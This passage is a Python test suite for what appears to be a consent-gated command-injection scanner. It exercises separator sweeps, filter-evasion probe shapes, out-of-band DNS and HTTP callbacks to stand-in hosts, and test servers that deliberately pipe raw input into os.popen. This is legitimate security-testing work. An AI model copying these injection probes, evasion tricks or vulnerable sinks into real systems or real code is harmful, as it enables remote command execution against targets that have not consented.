            results = self.gen.run_detection(
                [self.rec], url=f"{base}/x?q=FUZZ", methods=["time"],
                config={"time_base": 0.6})
            self.assertFalse([r for r in results if r["verdict"] == "confirmed"],
                             "random latency must never be confirmed")
            self.assertTrue(all(r["verdict"] == "negative" for r in results),
                            "a non-linear latency response is negative, not even a candidate")


class ReflectionControlTestCase(unittest.TestCase):
    """The paired same-token control decides reflection from execution, so it
    must fire whenever the verdict's own encoded-aware search matched. Gating it
    on a plain regex let a target that wraps its output (base64/hex/url/html)
    skip the control entirely and be reported 'confirmed' on pure reflection —
    exactly the case _encoded_search exists for."""

    def setUp(self):
        self.gen = RCEKit()
        self.token = "AB12CD"
        self.record = make_record(
            payload="; echo " + self.token, mode="detection", category="detection",
            safety="safe", token=self.token, match=re.escape(self.token))

    def test_encoded_reflection_is_inconclusive_not_confirmed(self):
        import base64

        def route(method, path, params, headers, body):
            # Echoes the parameter back, base64-wrapped. Nothing is ever executed.
            return 200, base64.b64encode(("you sent " + params.get("q", "")).encode()).decode()

        with local_target(route) as base:
            results = self.gen.run_verification([self.record], url=f"{base}/echo?q=FUZZ")
        self.assertEqual(len(results), 1)
        self.assertEqual(results[0]["verdict"], "inconclusive", results[0])

    def test_genuine_execution_still_confirms_through_an_encoded_wrapper(self):
        import base64

        def route(method, path, params, headers, body):
            # Stands in for a real sink: only a command break-out yields output,
            # so the inert same-token control comes back empty-handed.
            query = params.get("q", "")
            echoed = query.split("echo ", 1)[1] if query.startswith("; echo ") else ""
            out = f"command output follows: {echoed}" if echoed else "nothing executed here"
            return 200, base64.b64encode(out.encode()).decode()

        with local_target(route) as base:
            results = self.gen.run_verification([self.record], url=f"{base}/sink?q=FUZZ")
        self.assertEqual(len(results), 1)
        self.assertEqual(results[0]["verdict"], "confirmed", results[0])


class CLIExitCodeTestCase(unittest.TestCase):
    """Every refusal to run must exit non-zero so CI and wrapper scripts can
    branch on the status instead of scraping stdout. A completed run exits 0
    even when it confirmed nothing — that is a result, not a failure."""

    def _run(self, *args):
        return subprocess.run(
            [sys.executable, str(SCRIPT), *args],
            cwd=str(REPO_ROOT), capture_output=True, text=True, timeout=120,
        )

    def test_missing_consent_exits_non_zero(self):
        result = self._run("--categories", "basic_enum", "--environments", "unix")
        self.assertEqual(result.returncode, 1)
        self.assertIn("consent", result.stdout.lower())

    def test_unloadable_target_profile_exits_non_zero(self):
        result = self._run("--acknowledge-consent", "--target-profile", "/no/such/profile.json")
        self.assertEqual(result.returncode, 1)

    def test_verify_without_fuzz_marker_exits_non_zero(self):
        result = self._run("--acknowledge-consent", "--verify-url", "http://127.0.0.1:1/nomarker")
        self.assertEqual(result.returncode, 1)
        self.assertIn("FUZZ", result.stdout)

    def test_unknown_detection_method_exits_non_zero(self):
        result = self._run("--acknowledge-consent", "--categories", "basic_enum",
                           "--environments", "unix", "--max-payloads", "1",
                           "--methods", "nosuchmethod",
                           "--verify-url", "http://127.0.0.1:1/?q=FUZZ")
        self.assertEqual(result.returncode, 1)
        self.assertIn("Unknown --methods", result.stdout)

    def test_file_method_without_webroot_exits_non_zero(self):
        result = self._run("--acknowledge-consent", "--categories", "basic_enum",
                           "--environments", "unix", "--max-payloads", "1",
                           "--methods", "file",
                           "--verify-url", "http://127.0.0.1:1/?q=FUZZ")
        self.assertEqual(result.returncode, 1)
        self.assertIn("--webroot", result.stdout)

    def test_unreadable_request_file_exits_non_zero(self):
        result = self._run("--acknowledge-consent", "-r", "/no/such/request.txt")
        self.assertEqual(result.returncode, 1)

    def test_request_file_without_injection_point_exits_non_zero(self):
        with tempfile.TemporaryDirectory() as tmp:
            req = Path(tmp) / "req.txt"
            req.write_text("GET /a=1 HTTP/1.1\nHost: target.example\n\n")
            result = self._run("--acknowledge-consent", "-r", str(req))
            self.assertEqual(result.returncode, 1)

    def test_completed_generation_exits_zero(self):
        with tempfile.TemporaryDirectory() as tmp:
            out = Path(tmp) / "d.txt"
            result = self._run("--detection-only", "--environments", "unix", "-o", str(out))
            self.assertEqual(result.returncode, 0)


class DestructiveHoldBackTestCase(unittest.TestCase):
    """A payload that installs a backdoor or destroys data must be held back by
    default on EVERY live path. The single-request verifier did this and the
    multi-step chain did not, so the blast radius of a run depended on which
    delivery path it took."""

    def setUp(self):
        self.gen = RCEKit()

    def _records(self, max_safety):
        return list(self.gen.generate_payload_records(
            mode="exploit", max_safety=max_safety, include_blocking=False))

    def test_destructive_payloads_are_held_back_by_default(self):
        records = self._records("stateful")
        destructive = [r for r in records if r.destructive]
        self.assertTrue(destructive, "corpus should contain destructive payloads to exercise this")
        to_send, held = partition_destructive(records, allow_destructive=False)
        self.assertEqual(held, len(destructive))
        self.assertFalse([r for r in to_send if r.destructive])

    def test_opt_in_lets_them_through(self):
        records = self._records("stateful")
        to_send, held = partition_destructive(records, allow_destructive=True)
        self.assertEqual(held, 0)
        self.assertEqual(len(to_send), len(records))

    def test_chain_run_holds_back_destructive_payloads(self):
        # End-to-end through the CLI: the chain path must print the same
        # pre-flight plan and hold-back notice as --verify-url. Raising the risk
        # tier is what surfaces destructive payloads at all.
        with local_target(lambda *a: (200, "ok")) as base, tempfile.TemporaryDirectory() as tmp:
            chain = Path(tmp) / "chain.json"
            chain.write_text(json.dumps({
                "base": base,
                "steps": [{"name": "deliver", "method": "POST", "path": "/run",
                           "form": {"cmd": "FUZZ"}}],
            }))
            result = subprocess.run(
                [sys.executable, str(SCRIPT), "--acknowledge-consent",
                 "--categories", "file_operations", "--environments", "unix",
                 "--verify-active-risk", "stateful", "--max-payloads", "3",
                 "--verify-chain", str(chain)],
                cwd=tmp, capture_output=True, text=True, timeout=120)
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertIn("[plan]", result.stdout)
        self.assertIn("holding back", result.stdout)
        self.assertIn("--verify-allow-destructive", result.stdout)


class CleartextCaptureWarningTestCase(unittest.TestCase):
    """A portless capture stays http so lab and internal targets keep working,
    so the cleartext risk is surfaced instead of defaulted away: the inferred
    scheme is always reported, and a captured session about to go out in the
    clear is named."""

    def _run_with_request(self, raw, *extra):
        with tempfile.TemporaryDirectory() as tmp:
            req = Path(tmp) / "req.txt"
            req.write_text(raw)
            return subprocess.run(
                [sys.executable, str(SCRIPT), "--acknowledge-consent",
                 "--categories", "basic_enum", "--environments", "unix",
                 "--max-payloads", "1", "-r", str(req), *extra],
                cwd=tmp, capture_output=True, text=True, timeout=120)

    def test_credential_header_over_plain_http_is_flagged(self):
        result = self._run_with_request(
            "GET /q?a=FUZZ HTTP/1.1\r\nHost: 127.0.0.1:1\r\n"
            "Authorization: Bearer secret\r\nCookie: session=abc\r\n\r\n")
        self.assertIn("inferred http", result.stdout)
        self.assertIn("replayed over plain HTTP", result.stdout)
        self.assertIn("Authorization", result.stdout)
        self.assertIn("Cookie", result.stdout)
        self.assertIn("--request-scheme", result.stdout)
        self.assertNotIn("secret", result.stdout)  # names the header, never its value

    def test_no_warning_without_credential_headers(self):
        result = self._run_with_request(
            "GET /q?a=FUZZ HTTP/1.1\r\nHost: 127.0.0.1:1\r\nAccept: */*\r\n\r\n")
        self.assertIn("inferred http", result.stdout)
        self.assertNotIn("replayed over plain HTTP", result.stdout)

    def test_no_warning_when_the_scheme_was_given_explicitly(self):
        result = self._run_with_request(
            "GET /q?a=FUZZ HTTP/1.1\r\nHost: 127.0.0.1:1\r\n"
            "Authorization: Bearer secret\r\n\r\n",
            "--request-scheme", "http")
        self.assertNotIn("inferred http", result.stdout)
        self.assertNotIn("replayed over plain HTTP", result.stdout)


class OutputFailureTestCase(unittest.TestCase):
    """The generated file IS the deliverable, so a write that failed must not be
    reported as a successful run."""

    def test_unwritable_output_path_exits_non_zero(self):
        result = subprocess.run(
            [sys.executable, str(SCRIPT), "--detection-only", "--environments", "unix",
             "-o", "/no/such/directory/out.txt"],
            cwd=str(REPO_ROOT), capture_output=True, text=True, timeout=120)
        self.assertEqual(result.returncode, 1)
        self.assertIn("Unable to write output", result.stdout)
        self.assertNotIn("Generated", result.stdout)

    def test_write_failure_propagates_to_the_caller(self):
        gen = RCEKit()
        with self.assertRaises(OSError):
            gen.save_payloads_to_file(
                file_path="/no/such/directory/out.txt", mode="detection",
                selected_environments=["unix"])


class AuditRedactionTestCase(unittest.TestCase):
    """The audit trail records what was fired and by whom. Verification headers
    routinely carry the session that makes the target reachable at all, and a
    credential must not be persisted to disk just to record that a header was
    sent."""

    def test_sensitive_header_values_are_masked(self):
        masked = RCEKit.redact_headers([
            "Authorization: Bearer SUPERSECRET",
            "Cookie: session=SUPERSECRET",
            "X-Api-Key: SUPERSECRET",
            "Content-Type: application/json",
        ])
        self.assertEqual(masked[:3], ["Authorization: <redacted>",
                                      "Cookie: <redacted>",
                                      "X-Api-Key: <redacted>"])
        self.assertEqual(masked[3], "Content-Type: application/json")

    def test_header_names_survive_so_the_trail_stays_useful(self):
        masked = RCEKit.redact_headers(["Authorization: Bearer x"])
        self.assertIn("Authorization", masked[0])

    def test_no_headers_is_passed_through(self):
        self.assertIsNone(RCEKit.redact_headers(None))
        self.assertEqual(RCEKit.redact_headers([]), [])

    def test_credentials_never_reach_the_audit_log_on_disk(self):
        with tempfile.TemporaryDirectory() as tmp:
            out = Path(tmp) / "p.txt"
            result = subprocess.run(
                [sys.executable, str(SCRIPT), "--acknowledge-consent",
                 "--categories", "basic_enum", "--environments", "unix",
                 "--max-payloads", "1", "-o", str(out),
                 "--verify-header", "Authorization: Bearer SUPERSECRET"],
                cwd=tmp, capture_output=True, text=True, timeout=120)
            self.assertEqual(result.returncode, 0, result.stderr)
            audit = (Path(tmp) / "exploit_audit.log").read_text()
        self.assertNotIn("SUPERSECRET", audit)
        self.assertIn("Authorization", audit)
        self.assertIn("redacted", audit)


class SeparatorSweepTestCase(unittest.TestCase):
    """Shell probes sweep several command separators. A sink that filters ';' —
    the most common partial mitigation there is — stays exploitable through a
    pipe, a chain operator or a newline, so a probe that only ever tried ';'
    reported a genuinely vulnerable target as negative."""

    def setUp(self):
        self.gen = RCEKit()
        self.rec = make_record(environment="unix", context="raw")

    def _payloads(self, config=None, record=None):
        import random as _random
        method = ReflectedMath(self.gen, config or {})
        return [p.payload for p in method.build_probes(record or self.rec, _random.Random(1))]

    def test_probes_cover_every_default_separator(self):
        payloads = self._payloads()
        for separator in ("; ", "| ", "|| ", "&& ", "\n"):
            with self.subTest(separator=separator):
                self.assertTrue(any(p.startswith(separator) for p in payloads),
                                f"no probe breaks out with {separator!r}")

    def test_newline_separator_is_a_real_newline_not_percent_0a(self):
        # The delivery layer percent-encodes each probe for its injection point,
        # so a literal "%0a" would reach the sink as the text %250a. Only a real
        # newline survives that round trip.
        payloads = self._payloads()
        self.assertTrue(any(p.startswith("\n") for p in payloads))
        self.assertFalse(any(p.startswith("%0a") for p in payloads))
        newline_probe = next(p for p in payloads if p.startswith("\n"))
        self.assertEqual(self.gen._encode_for_location(newline_probe, "query_value")[:3], "%0A")

    def test_separators_are_configurable(self):
        # The space-free shape trims the separator's trailing space on purpose,
        # so match the separator itself rather than the spelling.
        payloads = self._payloads({"separators": ["| "]})
        self.assertTrue(payloads)
        self.assertTrue(all(p.startswith("| ") or p.startswith("|e") for p in payloads),
                        payloads)

    def test_sink_raw_still_sends_bare_commands(self):
        # With --sink-raw the input IS the whole command, so no probe may carry
        # a leading separator -- whichever command shape it uses.
        payloads = self._payloads({"sink_raw": True})
        self.assertTrue(payloads)
        for payload in payloads:
            with self.subTest(payload=payload):
                self.assertRegex(payload, r"^(echo|awk|expr)(\s|\$\{IFS\})")

    def test_file_probes_get_a_distinct_target_file_per_separator(self):
        # Sharing one filename would make every probe's followup succeed as soon
        # as any separator wrote it, so a confirmation could not say which
        # break-out worked and its cleanup would name another probe's file.
        import random as _random
        probes = FileBased(self.gen, {"webroot": "/var/www/html",
                                      "web_base_url": "http://t"}).build_probes(
            self.rec, _random.Random(1))
        self.assertEqual(len(probes), 5)
        urls = {p.followup["url"] for p in probes}
        tokens = {p.expected for p in probes}
        self.assertEqual(len(urls), len(probes))
        self.assertEqual(len(tokens), len(probes))
        for probe in probes:
            self.assertIn(probe.followup["path"].rsplit("/", 1)[-1], probe.followup["cleanup"])

    def test_aggregate_timing_screens_every_separator_then_commits_to_one(self):
        # ParametricTime reads a probe series as one measurement, so it cannot
        # mix separators through the regression. It screens them instead: one
        # cheap probe each, then the full regression through whichever one
        # actually delayed. Locking it to ';' alone reported a blind sink that
        # merely filters ';' as negative, while '| sleep 3' delayed on it.
        import random as _random
        method = ParametricTime(self.gen, {"time_base": 1.0})
        # Only the pipe breaks out on this imaginary sink. Drive the screen to
        # exhaustion: it runs in waves, so a separator missing from the first
        # batch is held back, not dropped.
        series, batch, regression = [], method.build_probes(self.rec, _random.Random(1)), []
        while batch:
            if all(p.phase == "regress" for p in batch):
                regression = batch
                break
            series += [(p, Observation(status=200, body="",
                                       elapsed=(p.delay_s or 0.0) + 0.05 if p.separator == "| "
                                       else 0.05)) for p in batch]
            batch = method.next_probes(series)
        screened = {p.payload[:2] for p, _ in series}
        for separator in ("; ", "| "):
            with self.subTest(separator=separator):
                self.assertIn(separator, screened)
        self.assertTrue(regression)
        self.assertEqual({p.separator for p in regression}, {"| "})

    def test_a_pipe_only_sink_is_now_confirmed(self):
        # End-to-end against a real sink that strips ';' and '&': exploitable
        # through a pipe, and previously reported negative.
        import os

        def route(method, path, params, headers, body):
            query = params.get("q", "").replace(";", "").replace("&", "")
            pipe = os.popen("echo probing " + query + " 2>&1")
            out = pipe.read()
            pipe.close()
            return 200, out

        with local_target(route) as base:
            results = self.gen.run_detection(
                [self.rec], url=f"{base}/x?q=FUZZ", methods=["reflected"])
        self.assertTrue([r for r in results if r["verdict"] == "confirmed"],
                        "a ';'-filtering sink must still be confirmed via another separator")

    def test_a_non_vulnerable_sink_stays_negative_under_the_sweep(self):
        # The sweep multiplies probes, so re-prove the precision it could erode.
        def route(method, path, params, headers, body):
            return 200, "you searched for: " + params.get("q", "")

        with local_target(route) as base:
            results = self.gen.run_detection(
                [self.rec], url=f"{base}/x?q=FUZZ", methods=["reflected"])
        self.assertTrue(results)
        self.assertFalse([r for r in results if r["verdict"] == "confirmed"])


class SelfSeparatingContextTestCase(unittest.TestCase):
    """A shell-quoted context's prefix already ends in a separator, so a probe
    must not add another. The generator has guarded this since it was found
    there; the detection engine had not, which made ``shell_single_quoted`` —
    the one context that actually fits a quoted sink — emit ``'; ; cmd`` and
    fail on exactly the sink it was for."""

    def setUp(self):
        self.gen = RCEKit()

    def _probe(self, context):
        import random as _random
        return ReflectedMath(self.gen).build_probes(
            make_record(environment="unix", context=context), _random.Random(1))[0].payload

    def test_quoted_contexts_do_not_double_the_separator(self):
        for context, prefix in (("shell_single_quoted", "'; "), ("shell_double_quoted", '"; ')):
            with self.subTest(context=context):
                payload = self._probe(context)
                self.assertTrue(payload.startswith(prefix), payload)
                self.assertNotIn("; ; ", payload)

    def test_unquoted_context_still_supplies_its_own_separator(self):
        self.assertTrue(self._probe("raw").startswith("; "))

    def test_generator_and_detection_share_one_definition(self):
        # The duplication is what let the two drift apart in the first place.
        self.assertEqual(rcekit.SELF_SEPARATING_CONTEXTS,
                         {"shell_single_quoted", "shell_double_quoted"})

    def test_a_single_quoted_sink_is_confirmed_with_its_own_context(self):
        import os

        def route(method, path, params, headers, body):
            pipe = os.popen("sh -c \"echo probing '" + params.get("q", "") + "'\" 2>&1")
            out = pipe.read()
            pipe.close()
            return 200, out

        with local_target(route) as base:
            results = self.gen.run_detection(
                [make_record(environment="unix", context="shell_single_quoted")],
                url=f"{base}/x?q=FUZZ", methods=["reflected"])
        self.assertTrue([r for r in results if r["verdict"] == "confirmed"],
                        "shell_single_quoted must confirm on a single-quoted sink")


class ShellCapableEnvironmentTestCase(unittest.TestCase):
    """An ``environment`` names what runs the application, not what executes the
    injected command. PHP's system(), Python's os.system() and Node's
    child_process.exec() all hand the string to /bin/sh, and the corpus has
    always shipped those sinks — but the shell methods gated on the shell
    environments alone, so scoping a run to the language the application is
    written in sent no shell probes and reported a clean negative."""

    def setUp(self):
        self.gen = RCEKit()
        self.config = {"webroot": "/var/www/html", "web_base_url": "http://t"}

    def _rec(self, env):
        return make_record(environment=env, context="raw")

    def test_language_runtimes_get_shell_probes(self):
        for env in ("php", "python", "nodejs", "java", "dotnet", "ruby", "perl", "go"):
            for cls in (ReflectedMath, FileBased, ParametricTime):
                with self.subTest(environment=env, method=cls.name):
                    self.assertTrue(cls(self.gen, self.config).applicable(self._rec(env)))

    def test_shell_environments_still_apply(self):
        for env in ("unix", "docker", "kubernetes", "windows"):
            with self.subTest(environment=env):
                self.assertTrue(ReflectedMath(self.gen).applicable(self._rec(env)))

    def test_data_layer_environments_stay_out(self):
        # Reaching a shell from these needs a distinct escalation (xp_cmdshell,
        # COPY FROM PROGRAM, a resolver into a command sink) and so a distinct
        # probe; claiming applicability would only send probes that cannot fire.
        for env in ("sql", "graphql", "mongodb"):
            with self.subTest(environment=env):
                self.assertFalse(ReflectedMath(self.gen).applicable(self._rec(env)))

    def test_language_runtime_probes_take_the_unix_shape(self):
        # A language runtime does not say which OS it runs on; --environments
        # windows stays the way to get cmd.exe probes.
        import random as _random
        probe = ReflectedMath(self.gen).build_probes(self._rec("php"), _random.Random(1))[0]
        self.assertIn("$((", probe.payload)
        self.assertNotIn("set /a", probe.payload)

    def test_php_system_sink_is_confirmed_under_its_own_environment(self):
        import os

        def route(method, path, params, headers, body):
            pipe = os.popen("echo pinging " + params.get("q", "") + " 2>&1")
            out = pipe.read()
            pipe.close()
            return 200, out

        with local_target(route) as base:
            results = self.gen.run_detection(
                [self._rec("php")], url=f"{base}/x?q=FUZZ", methods=["reflected"])
        self.assertTrue([r for r in results if r["verdict"] == "confirmed"],
                        "a system() sink must confirm under --environments php")


class NoProbesBuiltTestCase(unittest.TestCase):
    """A run that built no probes tested nothing, and used to end in silence and
    exit 0 — indistinguishable from a target that came back clean."""

    def _run(self, *args, cwd=None):
        return subprocess.run(
            [sys.executable, str(SCRIPT), *args],
            cwd=str(cwd or REPO_ROOT), capture_output=True, text=True, timeout=120)

    def _detect(self, *extra):
        return self._run("--acknowledge-consent", "--contexts", "raw", "--max-payloads", "3",
                         "--verify-url", "http://127.0.0.1:9/?q=FUZZ", *extra)

    def test_zero_probes_is_reported_and_exits_non_zero(self):
        result = self._detect("--environments", "mongodb", "--categories", "nosql_injection",
                              "--methods", "reflected")
        self.assertEqual(result.returncode, 1, result.stdout)
        self.assertIn("NOTHING WAS TESTED", result.stdout)
        self.assertIn("not a negative result", result.stdout)

    def test_the_message_names_the_environment_and_the_way_out(self):
        result = self._detect("--environments", "mongodb", "--categories", "nosql_injection",
                              "--methods", "reflected")
        self.assertIn("mongodb", result.stdout)
        self.assertIn("--environments unix", result.stdout)
        self.assertIn("--methods eval", result.stdout)

    def test_a_run_that_did_send_probes_is_unaffected(self):
        # Nothing listens on port 9, so every probe errors — but probes were
        # built, so this stays the ordinary reporting path.
        result = self._detect("--environments", "unix", "--categories", "basic_enum",
                              "--methods", "reflected")
        self.assertEqual(result.returncode, 0, result.stdout)
        self.assertNotIn("NOTHING WAS TESTED", result.stdout)
        self.assertIn("NEVER REACHED THE TARGET", result.stdout)


class ProbeDepthTestCase(unittest.TestCase):
    """The canonical probes route their arithmetic through a command
    substitution and spell the command `echo`/`expr`. That is two blind spots,
    and both are filters seen in the wild: a sink that strips `$(` blocks
    `$((` (a prefix of it) and the backtick too, and a keyword filter on
    `echo`/`expr` blocks both. The extended shapes exist to reach those."""

    def setUp(self):
        self.gen = RCEKit()
        self.rec = make_record(environment="unix", context="raw")

    def _payloads(self, depth):
        import random as _random
        method = ReflectedMath(self.gen, {"probe_depth": depth})
        return [p.payload for p in method.build_probes(self.rec, _random.Random(1))]

    def test_full_depth_adds_substitution_free_shapes(self):
        payloads = self._payloads("full")
        substitution_free = [p for p in payloads if "$(" not in p and "`" not in p]
        self.assertTrue(substitution_free,
                        "a sink stripping '$(' and backticks would block every probe")
        self.assertTrue(any("awk " in p for p in substitution_free))
        self.assertTrue(any(re.search(r"expr \d+ \+ \d+", p) for p in substitution_free))

    def test_full_depth_adds_a_shape_free_of_the_usual_keywords(self):
        # A WAF blocking the usual command words must still meet a live probe,
        # so at least one shape must invoke none of them. Compare the command
        # word itself, not the whole payload: the random tags are letters and
        # could contain any short sequence by chance.
        blocked = {"echo", "expr", "cat", "id", "whoami", "sleep"}
        commands = set()
        for payload in self._payloads("full"):
            commands.update(re.findall(r"(?:^|[;|&\n]\s*)([a-z]+)\b", payload))
        self.assertTrue(commands - blocked, commands)

    def test_full_depth_adds_comment_terminated_shapes(self):
        payloads = self._payloads("full")
        self.assertTrue(any(p.rstrip().endswith("#") for p in payloads))

    def test_quick_depth_sends_only_the_canonical_shapes(self):
        quick, full = self._payloads("quick"), self._payloads("full")
        self.assertLess(len(quick), len(full))
        self.assertFalse([p for p in quick if "awk " in p or p.rstrip().endswith("#")])

    def test_quick_is_the_subset_full_extends(self):
        # 'quick' must not be a different probe set, only a smaller one --
        # otherwise a target that confirms under one could miss under the other.
        self.assertTrue(set(self._payloads("quick")) <= set(self._payloads("full")))

    def test_default_depth_is_full(self):
        import random as _random
        default = [p.payload for p in
                   ReflectedMath(self.gen, {}).build_probes(self.rec, _random.Random(1))]
        self.assertEqual(sorted(default), sorted(self._payloads("full")))

    def test_every_probe_still_carries_an_unforgeable_expected_value(self):
        # The whole tier rests on this: the expected value must never be a
        # literal the payload already spells out, or reflection could fake it.
        import random as _random
        probes = ReflectedMath(self.gen, {}).build_probes(self.rec, _random.Random(3))
        for probe in probes:
            with self.subTest(payload=probe.payload):
                self.assertNotIn(probe.expected, probe.payload)

    def test_comment_termination_is_skipped_where_it_would_misfire(self):
        # cmd.exe has no '#' comment, and a context that closes with its own
        # suffix would have the suffix commented out instead of the sink's tail.
        import random as _random
        method = ReflectedMath(self.gen, {})
        windows = method._wrap_variants(make_record(environment="windows", context="raw"),
                                        "echo x", windows=True, terminate=True)
        self.assertEqual(windows, [])
        quoted = method._wrap_variants(make_record(environment="unix", context="attribute"),
                                       "echo x", terminate=True)
        self.assertEqual(quoted, [])

    def test_a_substitution_blocking_sink_is_confirmed(self):
        import os

        def route(method, path, params, headers, body):
            query = params.get("q", "")
            if "$(" in query or "`" in query:
                return 200, "BLOCKED"
            pipe = os.popen("echo probing " + query + " 2>/dev/null")
            out = pipe.read()
            pipe.close()
            return 200, out

        with local_target(route) as base:
            results = self.gen.run_detection(
                [self.rec], url=f"{base}/x?q=FUZZ", methods=["reflected"])
        self.assertTrue([r for r in results if r["verdict"] == "confirmed"],
                        "a sink that only strips substitutions is still exploitable")

    def test_a_sink_that_appends_a_redirect_is_confirmed(self):
        # `<cmd> <input> | grep <something>` swallows the probe's output
        # entirely, so the probe executes and reads as negative unless it
        # comments the tail out.
        import os

        def route(method, path, params, headers, body):
            pipe = os.popen("echo probing " + params.get("q", "") + " | grep -c NOTHINGHERE")
            out = pipe.read()
            pipe.close()
            return 200, out

        with local_target(route) as base:
            results = self.gen.run_detection(
                [self.rec], url=f"{base}/x?q=FUZZ", methods=["reflected"])
        self.assertTrue([r for r in results if r["verdict"] == "confirmed"])

    def test_the_extra_shapes_do_not_cost_precision(self):
        # More probe shapes means more chances to be wrong; re-prove that an
        # inert reflecting sink stays negative.
        def route(method, path, params, headers, body):
            return 200, f"<div>you searched for: {params.get('q', '')}</div>"

        with local_target(route) as base:
            results = self.gen.run_detection(
                [self.rec], url=f"{base}/x?q=FUZZ", methods=["reflected", "eval"])
        self.assertTrue(results)
        self.assertFalse([r for r in results if r["verdict"] == "confirmed"])


class QuotedShellCarrierTestCase(unittest.TestCase):
    """`shell_single_quoted`/`shell_double_quoted` fit a `ping '<input>'` sink —
    input interpolated inside quotes, which no probe built for an unquoted
    context escapes. The generator has always had them, but they are absent from
    `default_contexts`, so no record carried them and the detection engine never
    tried them: the one sink shape they exist for was the one that could not be
    detected at all."""

    def setUp(self):
        self.gen = RCEKit()

    def _carriers(self, config):
        base = [make_record(environment="unix", context="raw")]
        seen = {("unix", "raw")}
        return [r.context for r in RCEKit._quoted_shell_carriers(base, seen, config)]

    def test_quoted_contexts_are_added_by_default(self):
        self.assertEqual(sorted(self._carriers({})),
                         ["shell_double_quoted", "shell_single_quoted"])

    def test_an_explicit_contexts_selection_is_respected(self):
        # Narrowing the run is a deliberate choice about what to send; widening
        # it behind the operator's back is not this function's call.
        self.assertEqual(self._carriers({"contexts_explicit": True}), [])

    def test_non_shell_environments_are_left_alone(self):
        base = [make_record(environment="mongodb", context="raw")]
        self.assertEqual(RCEKit._quoted_shell_carriers(base, {("mongodb", "raw")}, {}), [])

    def test_already_present_contexts_are_not_duplicated(self):
        base = [make_record(environment="unix", context="shell_single_quoted")]
        seen = {("unix", "shell_single_quoted")}
        self.assertEqual([r.context for r in RCEKit._quoted_shell_carriers(base, seen, {})],
                         ["shell_double_quoted"])

    def test_a_single_quoted_sink_is_confirmed_without_naming_the_context(self):
        import os

        def route(method, path, params, headers, body):
            pipe = os.popen("echo probing '" + params.get("q", "") + "' 2>/dev/null")
            out = pipe.read()
            pipe.close()
            return 200, out

        record = make_record(environment="unix", context="raw")
        with local_target(route) as base:
            results = self.gen.run_detection(
                [record], url=f"{base}/x?q=FUZZ", methods=["reflected"])
        confirmed = [r for r in results if r["verdict"] == "confirmed"]
        self.assertTrue(confirmed, "a quoted sink must be reachable without --contexts")
        self.assertTrue(any(r["context"] == "shell_single_quoted" for r in confirmed))


class OobCallbackTestCase(unittest.TestCase):
    """Out-of-band detection. A fully blind sink -- nothing in the response, no
    writable web root -- had no path to a `confirmed` verdict at all."""

    def setUp(self):
        self.gen = RCEKit()
        self.rec = make_record(environment="unix", context="raw")

    def _probes(self, config):
        import random as _random
        method = rcekit.OobCallback(self.gen, config)
        return method, method.build_probes(self.rec, _random.Random(1))

    def test_it_does_not_run_without_an_oob_host(self):
        # It makes the target open outbound connections, so it stays off until
        # the operator names the host.
        self.assertFalse(rcekit.OobCallback(self.gen, {}).applicable(self.rec))
        self.assertTrue(
            rcekit.OobCallback(self.gen, {"oob_host": "x.example"}).applicable(self.rec))

    def test_each_separator_gets_its_own_token(self):
        # Sharing one token would mark every separator confirmed as soon as any
        # one called back -- and `cmd || curl` never runs when cmd succeeds, so
        # the report would name payloads that did nothing.
        _, probes = self._probes({"oob_host": "x.example"})
        tokens = [p.expected for p in probes]
        self.assertEqual(len(tokens), len(set(tokens)))
        for probe in probes:
            with self.subTest(payload=probe.payload):
                self.assertIn(probe.expected, probe.payload)

    def test_a_named_host_gets_dns_shapes(self):
        _, probes = self._probes({"oob_host": "x.example"})
        self.assertTrue(any("nslookup" in p.payload for p in probes))
        self.assertTrue(any(f"{p.expected}.x.example" in p.payload for p in probes))

    def test_a_computed_value_rides_in_one_dns_label(self):
        # The callback then proves the shell evaluated arithmetic, not merely
        # that something resolved a name it was handed.
        method, probes = self._probes({"oob_host": "x.example"})
        computed = [p for p in probes if "$((" in p.payload]
        self.assertTrue(computed)
        self.assertIsNotNone(method._computed)

    def test_an_ip_host_puts_the_token_in_the_path_and_drops_dns(self):
        # `<token>.10.0.0.1` resolves nowhere, so those probes could never call
        # back; the token rides in the URL path instead.
        _, probes = self._probes({"oob_host": "10.0.0.1"})
        self.assertTrue(probes)
        self.assertFalse([p for p in probes if "nslookup" in p.payload or "host " in p.payload])
        for probe in probes:
            with self.subTest(payload=probe.payload):
                self.assertIn(f"/{probe.expected}", probe.payload)
                self.assertNotIn(f"{probe.expected}.10.0.0.1", probe.payload)

    def test_ip_literal_detection(self):
        for host in ("10.0.0.1", "127.0.0.1", "::1", "[fe80::1]"):
            self.assertTrue(rcekit.OobCallback._is_ip_literal(host), host)
        for host in ("x.example", "a.b.c.d", "999.1.1.1", "target.local"):
            self.assertFalse(rcekit.OobCallback._is_ip_literal(host), host)

    def test_a_probe_whose_token_came_back_is_confirmed_and_others_are_not(self):
        listener = OOBListener()
        method = rcekit.OobCallback(self.gen, {"oob_host": "x.example",
                                               "oob_listener": listener, "oob_wait": 0.1})
        import random as _random
        probes = method.build_probes(self.rec, _random.Random(1))
        arrived = probes[0]
        listener.record("dns", "10.0.0.9", f"{arrived.expected}.x.example")
        series = [(p, Observation(status=200, body="ok")) for p in probes]
        verdicts = dict((p.payload, v.status) for p, v in method.confirm_each(series))
        self.assertEqual(verdicts[arrived.payload], "confirmed")
        self.assertEqual({v for payload, v in verdicts.items() if payload != arrived.payload},
                         {"negative"})

    def test_a_delivery_failure_is_an_error_not_a_negative(self):
        listener = OOBListener()
        method = rcekit.OobCallback(self.gen, {"oob_host": "x.example",
                                               "oob_listener": listener, "oob_wait": 0.1})
        import random as _random
        probes = method.build_probes(self.rec, _random.Random(1))[:1]
        series = [(probes[0], Observation(status=None, body="connection refused"))]
        self.assertEqual(method.confirm_each(series)[0][1].status, "error")

    def test_without_a_listener_nothing_is_reported_as_negative(self):
        # A missing listener means we could not have seen a callback; calling
        # that 'not vulnerable' is exactly the lie the error tier exists for.
        method = rcekit.OobCallback(self.gen, {"oob_host": "x.example"})
        import random as _random
        probes = method.build_probes(self.rec, _random.Random(1))[:1]
        series = [(probes[0], Observation(status=200, body="ok"))]
        self.assertEqual(method.confirm_each(series)[0][1].status, "error")

    def test_end_to_end_a_blind_sink_is_confirmed_via_the_callback(self):
        import os
        listener = OOBListener()
        port = listener.start_http(0).server_address[1]

        def route(method, path, params, headers, body):
            # Blind: runs the command, returns nothing about it.
            pipe = os.popen("echo probing " + params.get("q", "") + " >/dev/null 2>&1")
            pipe.read()
            pipe.close()
            return 200, "queued"

        try:
            with local_target(route) as base:
                results = self.gen.run_detection(
